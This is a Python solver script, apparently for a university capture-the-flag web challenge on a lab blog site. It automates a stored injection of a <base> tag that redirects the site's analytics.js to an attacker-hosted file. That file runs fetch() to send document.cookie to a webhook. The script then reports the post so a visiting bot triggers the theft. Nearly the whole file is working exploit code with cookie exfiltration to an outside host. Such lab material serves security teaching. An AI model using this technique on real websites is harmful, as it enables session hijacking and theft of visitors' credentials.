import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite, HostedWebsiteCSE

from bs4 import BeautifulSoup
import html

BASE_URL = "https://engineering.quoccacorp.com"
HTML_FILENAME = f"{Path(__file__).stem}.html"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()
        self.hosted_website = HostedWebsiteCSE()
        self.hosted_website.connect()

    # Recon. Example: https://engineering.quoccacorp.com/posts/f6e357b7-eb71-4fbc-b518-3aa696d667c5
    def get_blog_post_html(self):
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        blog_post_root_relative_path = soup.find_all('a', href=True)[-1]
        blog_post_url = f"{BASE_URL}{blog_post_root_relative_path["href"]}"
        response = self.session.get(blog_post_url)
        return response.text

    # Paste into https://csp-evaluator.withgoogle.com
    def get_csp(self, url: str = BASE_URL) -> str:
        response = self.session.get(url)
        return response.headers["Content-Security-Policy"]

    # /analytics.js
    def scrape_root_relative_js_script_path(self) -> str:
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        target_script_element = soup.find_all("script", src=True)[-1]
        return target_script_element["src"]

    def main(self):
        js_script_path = self.scrape_root_relative_js_script_path()
        js_filename = js_script_path.lstrip('/') # analytics.js

        # Craft JS file payload
        JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'

        # Upload JS file to root directory of our hosted website
        self.hosted_website.upload_file(js_filename, JS_PAYLOAD.encode(), write_to_root=True)

        # Craft <base> tag payload (change base URL to the base URL of our hosted website)
        BLOG_POST_CONTENT_PAYLOAD = f'<base href="https://z5437741.web.cse.unsw.edu.au">'

        # Create new blog post with the <base> tag payload
        response = self.session.post(f"{BASE_URL}/posts", data={
            "title": f"{JS_PAYLOAD = }\n{BLOG_POST_CONTENT_PAYLOAD = }", # "title" can be anything
            "content": f"{html.escape(BLOG_POST_CONTENT_PAYLOAD)}\n{BLOG_POST_CONTENT_PAYLOAD}"} # "content" must contain the payload
        )

        # Report Blog Post
        response = self.session.post(f"{response.url}/report")
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
